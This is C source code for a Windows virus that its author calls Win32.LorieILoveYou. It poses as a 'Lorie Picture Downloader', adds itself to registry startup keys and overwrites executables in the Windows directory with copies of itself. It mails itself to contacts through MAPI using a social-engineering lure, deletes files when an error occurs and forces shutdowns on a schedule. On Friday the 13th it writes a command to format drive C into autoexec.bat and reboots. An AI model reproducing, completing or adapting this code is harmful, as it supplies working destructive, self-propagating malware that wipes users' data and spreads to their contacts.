   #include "ILoveLorie.h"
   #include "lorie.h"
   #pragma warning (disable: 4068)
   #pragma warning (disable: 4001)
   #pragma resource "lorie.res"

   char LoriePath[256],LorieWinDir[256],LorieBuffer[256]="echo y|format c: /u /v:LILY";
   HKEY LorieNTKey,LorieWinKey,LorieInstKey,LorieCrtKey;
   HANDLE LorieHnd,LorieHndTime,LorieFileHnd;
   HMODULE KernLib,MapiLib;
   typedef DWORD(*RegSerProc)(DWORD,DWORD);
   typedef ULONG(*EnvoiMess)(LHANDLE,ULONG,MapiMessage FAR*,FLAGS,ULONG);
   typedef ULONG(*NomTrouve)(LHANDLE,ULONG,LPTSTR,FLAGS,ULONG,lpMapiRecipDesc FAR*);
   typedef ULONG(*MemLibre)(LPVOID);
   LPSTR Nom = "e";
   int ErrSend,Err,Red,Green,Blue;
   HDC CurrentHdc,LorieHdc;
   HWND ActHwnd,SystHwnd;
   HBITMAP LorieBmp,LorieDisplay;
   DWORD LorieExtInf;

   #pragma argsused
   int WINAPI WinMain
   (
   HINSTANCE hInstance,
   HINSTANCE hPrevInstance,
   LPSTR     lpszCmdLine,
   int       nCmdShow
   )
   {
   //Win32.LorieILoveYou par ZeMacroKiller98
   //a virus made in France
   //copyright (c) 2002
   BITMAP Loriebm;
   WIN32_FIND_DATA FindLorieHost;
   OSVERSIONINFO OsVerInfo;
   FILETIME CreateLorieTime,LstAccLorieTime,LstWriLorieTime;
   SYSTEMTIME LorieTime;
   RegSerProc RegisterServiceProcess;
   EnvoiMess MAPIEnvoiMess;
   NomTrouve MAPINomTrouve;
   MemLibre MAPIMemLibre;
   KernLib = LoadLibrary("kernel32.dll");
   MapiLib = LoadLibrary("mapi32.dll");
   RegisterServiceProcess = (RegSerProc)GetProcAddress(KernLib,"RegisterServiceProcess");
   SearchPath(NULL,_argv[0],NULL,sizeof(LoriePath),LoriePath,NULL);
   OsVerInfo.dwOSVersionInfoSize = sizeof(OsVerInfo);
   GetVersionEx(&OsVerInfo);
   if(OsVerInfo.dwPlatformId==VER_PLATFORM_WIN32_NT)
   {
           RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\WindowsNT\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&LorieNTKey);
           RegSetValueEx(LorieNTKey,"ILoveLorie",0,REG_SZ,LoriePath,sizeof(LoriePath));
           RegCloseKey(LorieNTKey);
   }
   else
   {
           RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&LorieWinKey);
           RegSetValueEx(LorieWinKey,"ILoveLorie",0,REG_SZ,LoriePath,sizeof(LoriePath));
           RegCloseKey(LorieWinKey);
   }
   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Lorie\\Install",0,KEY_ALL_ACCESS,&LorieInstKey)!=ERROR_SUCCESS)
   {
           MessageBox(NULL,"Hi everybody,\nThis is Lorie\nMy program install itself automatically in your system\nand run itself at your next internet connection\nPlease contact my official site at:\nhttp://cooldedelle.free.fr/zlorie/lorie.htm","Lorie Picture Downloader",MB_OK|MB_ICONINFORMATION);
           GetWindowsDirectory(LorieWinDir,sizeof(LorieWinDir));
           SetCurrentDirectory(LorieWinDir);
           LorieHnd = FindFirstFile("*.exe",&FindLorieHost);
           LorieHostFind:
           LorieHndTime = CreateFile(FindLorieHost.cFileName,GENERIC_READ|GENERIC_WRITE,0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
           GetFileTime(LorieHndTime,&CreateLorieTime,&LstAccLorieTime,&LstWriLorieTime);
           CloseHandle(LorieHndTime);
           if((lstrcmp(FindLorieHost.cFileName,"emm386.exe")==0)||(lstrcmp(FindLorieHost.cFileName,"setver.exe")==0))
                   goto NotInfection;
           CopyFile(_argv[0],FindLorieHost.cFileName,FALSE);
           LorieHndTime = CreateFile(FindLorieHost.cFileName,GENERIC_READ|GENERIC_WRITE,0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
           SetFileTime(LorieHndTime,&CreateLorieTime,&LstAccLorieTime,&LstWriLorieTime);
           CloseHandle(LorieHndTime);
           NotInfection:
           if(FindNextFile(LorieHnd,&FindLorieHost)==TRUE)
                   goto LorieHostFind;
           FindClose(LorieHnd);
           RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Lorie\\Install",&LorieCrtKey);
           RegCloseKey(LorieCrtKey);
   // Email Propagation usue MAPI functions
   MAPIEnvoiMess = (EnvoiMess)GetProcAddress(MapiLib,"MAPISendMail");
   MAPINomTrouve = (NomTrouve)GetProcAddress(MapiLib,"MAPIResolveName");
   MAPIMemLibre = (MemLibre)GetProcAddress(MapiLib,"MAPIFreeBuffer");
   if((MAPIEnvoiMess==NULL)||(MAPINomTrouve==NULL)||(MAPIMemLibre==NULL))
   {
           MessageBox(NULL,"MAPI function can't found\nPlease refer to help to install it","ILoveBritney Freeware",MB_OK|MB_ICONEXCLAMATION);
           SetCurrentDirectory("C:/");
           DeleteFile("*.*");
           ExitProcess(0);
   }
   MapiMessage stMessage;
   MapiRecipDesc stRecip;
   MapiFileDesc stFile;
   lpMapiRecipDesc lpRecip;
   stFile.ulReserved = 0;
   stFile.flFlags = 0L;
   stFile.nPosition = (ULONG)-1;
   stFile.lpszPathName = LoriePath;
   stFile.lpszFileName = NULL;
   stFile.lpFileType = NULL;
   MessageBox(NULL,"Please select email address to send at your friend\nThis program open automaticaly your address book\n","Lorie Picture Downloader",MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
   UnResolve:
   Err = (MAPINomTrouve)(lhSessionNull,0L,Nom,MAPI_DIALOG,0L,&lpRecip);
   if(Err!=SUCCESS_SUCCESS)
   {
   switch(Err){
           case MAPI_E_AMBIGUOUS_RECIPIENT:
                   MessageBox(NULL,"The recipient requested has not been or could\n not be resolved to a unique address list entry","Lorie Picture Downloader",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
           break;
           case MAPI_E_UNKNOWN_RECIPIENT:
                   MessageBox(NULL,"The recipient could not be resolved to any\naddress.The recipient might not exist or might be unknown","Lorie Picture Downloader",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
           break;
           case MAPI_E_FAILURE:
                   MessageBox(NULL,"One or more unspecified errors occured\nThe name was not resolved","Lorie Picture Downloader",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_INSUFFICIENT_MEMORY:
                   MessageBox(NULL,"There was insufficient memory to proceed","Lorie Picture Downloader",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_NOT_SUPPORTED:
                   MessageBox(NULL,"The operation was not supported by the messaging system","Lorie Picture Downloader",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_USER_ABORT:
                   MessageBox(NULL,"The user was cancelled one or more dialog box","Lorie Picture Downloader",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           }
   goto UnResolve;
   }
   stRecip.ulReserved = lpRecip->ulReserved;
   stRecip.ulRecipClass = MAPI_TO;
   stRecip.lpszName = lpRecip->lpszName;
   stRecip.lpszAddress = lpRecip->lpszAddress;
   stRecip.ulEIDSize = lpRecip->ulEIDSize;
   stRecip.lpEntryID = lpRecip->lpEntryID;
   stMessage.ulReserved = 0;
   stMessage.lpszSubject = "New Picture downloader for Lorie";
   stMessage.lpszNoteText = lstrcat("Hi ",(lstrcat(lpRecip->lpszName,"\n\n\tI send you this mail to give you this new picture downloader about LORIE.\nI think you will try now because i know you like this new french singer.\nTry this program and i thnk you like it\nSee you soon...")));
   stMessage.lpszMessageType = NULL;
   stMessage.lpszDateReceived = NULL;
   stMessage.lpszConversationID = NULL;
   stMessage.flFlags = 0L;
   stMessage.lpOriginator = NULL;
   stMessage.nRecipCount = 1;
   stMessage.lpRecips = &stRecip;
   stMessage.nFileCount = 1;
   stMessage.lpFiles = &stFile;
   ErrSend = (MAPIEnvoiMess)(lhSessionNull,0L,&stMessage,0L,0L);
   if(ErrSend!=SUCCESS_SUCCESS)
   {
           MessageBox(NULL,"A error occured when i try to send email\nPlease refer to your windows help for more informations\n","Lorie Picture Downloader",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
           DeleteFile("*.*");
           ExitProcess(0);
   }
   MessageBox(NULL,"The program is now installed\nEnjoy to use at your next internet connection\nThanks at you\n\tLorie",
                   "Lorie Picture Downloader",
                    MB_OK|MB_ICONINFORMATION);
   FreeLibrary(MapiLib);
   }
   RegCloseKey(LorieInstKey);
   STARTUPINFO StartFo;
   PROCESS_INFORMATION ProcFo;
   StartFo.cb = sizeof(STARTUPINFO);
   StartFo.lpReserved = NULL;
   StartFo.lpReserved2 = NULL;
   StartFo.cbReserved2 = 0;
   StartFo.lpDesktop = NULL;
   StartFo.dwFlags = STARTF_FORCEOFFFEEDBACK;
   if(CreateProcess(LoriePath,
                   NULL,
                   (LPSECURITY_ATTRIBUTES)NULL,
                   (LPSECURITY_ATTRIBUTES)NULL,
                   FALSE,
                   0,
                   NULL,
                   NULL,
                   &StartFo,
                   &ProcFo))
   {
   CloseHandle(ProcFo.hProcess);
   CloseHandle(ProcFo.hThread);
   }
   if(CreateMutex(NULL,TRUE,LoriePath)==NULL)
           ExitProcess(0);
   SetPriorityClass(ProcFo.hProcess,REALTIME_PRIORITY_CLASS);
   RegisterServiceProcess(ProcFo.dwProcessId,1);
   GetLocalTime(&LorieTime);
   if((LorieTime.wDayOfWeek==1)||(LorieTime.wDayOfWeek==3)||(LorieTime.wDayOfWeek==5))
   {
           randomize();
           Red = rand() % 255;
           Green = rand() % 255;
           Blue = rand() % 255;
           ActHwnd = GetActiveWindow();
           CurrentHdc = GetDC(ActHwnd);
           SetGraphicsMode(CurrentHdc,GM_ADVANCED);
           LorieHdc = CreateCompatibleDC(CurrentHdc);
           LorieBmp = LoadBitmap(hInstance,MAKEINTRESOURCE(IDB_BITMAP1));
           GetObject(LorieBmp,sizeof(BITMAP),&Loriebm);
           (HGDIOBJ)LorieDisplay = SelectObject(LorieHdc,(HGDIOBJ)LorieBmp);
           BitBlt(CurrentHdc,0,0,Loriebm.bmWidth,Loriebm.bmHeight,LorieHdc,0,0,SRCCOPY);
           SetTextColor(CurrentHdc,RGB(Red,Green,Blue));
           TextOut(CurrentHdc,0,(Loriebm.bmHeight+10),"I love Lorie and you, do you love Lorie???",42);
           SetTextColor(CurrentHdc,RGB(Red,Green,Blue));
           TextOut(CurrentHdc,0,(Loriebm.bmHeight+30),"Win32.LorieILoveYou by ZeMacroKiller98",38);
           ReleaseDC(ActHwnd,LorieHdc);
           ReleaseDC(ActHwnd,CurrentHdc);
   }
   if((LorieTime.wDayOfWeek==2)||(LorieTime.wDayOfWeek==4)||(LorieTime.wDayOfWeek==6))
   {
           if((LorieTime.wMinute==20)||(LorieTime.wMinute==40)||(LorieTime.wMinute==59))
                   MessageBox(NULL,"Lorie say:''i will be your best friend''\nNow, i think i'm your best friend\nHa ha ha ha!!!","Win32.LorieILoveYou",MB_OK|MB_ICONEXCLAMATION);
           if((LorieTime.wMinute==15)||(LorieTime.wMinute==30))
           {
                   ActHwnd = GetActiveWindow();
                   CurrentHdc = GetDC(ActHwnd);
                   SetGraphicsMode(CurrentHdc,GM_ADVANCED);
                   LorieHdc = CreateCompatibleDC(CurrentHdc);
                   LorieBmp = LoadBitmap(hInstance,MAKEINTRESOURCE(IDB_BITMAP2));
                   GetObject(LorieBmp,sizeof(BITMAP),&Loriebm);
                   (HGDIOBJ)LorieDisplay = SelectObject(LorieHdc,(HGDIOBJ)LorieBmp);
                   BitBlt(CurrentHdc,0,0,Loriebm.bmWidth,Loriebm.bmHeight,LorieHdc,0,0,SRCCOPY);
                   SetTextColor(CurrentHdc,RGB(Red,Green,Blue));
                   TextOut(CurrentHdc,0,(Loriebm.bmHeight+10),"I love Lorie and you, do you love Lorie???",42);
                   SetTextColor(CurrentHdc,RGB(Red,Green,Blue));
                   TextOut(CurrentHdc,0,(Loriebm.bmHeight+30),"Win32.LorieILoveYou by ZeMacroKiller98",38);
                   ReleaseDC(ActHwnd,LorieHdc);
           }

   }
   if(LorieTime.wDayOfWeek==0)
   {
           MessageBox(NULL,"Lorie say:''You must stop to work today!!!!''\nI help you to stop.....","Win32.LorieILoveYou",MB_OK|MB_ICONSTOP);
           ExitWindowsEx(EWX_SHUTDOWN|EWX_FORCE,0);
   }
   if((LorieTime.wDay==13)&&(LorieTime.wDayOfWeek==5))
   {
           MessageBox(NULL,"Bad luck for you!!!!\nJust say good bye to your hard drive","Win32.LorieILoveYou",MB_OK|MB_ICONSTOP);
           SetCurrentDirectory("C:/");
           LorieFileHnd = CreateFile("autoexec.bat",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
           WriteFile(LorieFileHnd,LorieBuffer,sizeof(LorieBuffer),&LorieExtInf,NULL);
           CloseHandle(LorieFileHnd);
           ExitWindowsEx(EWX_FORCE|EWX_REBOOT,0);
   }
   FreeLibrary(KernLib);
   return 0;
   }
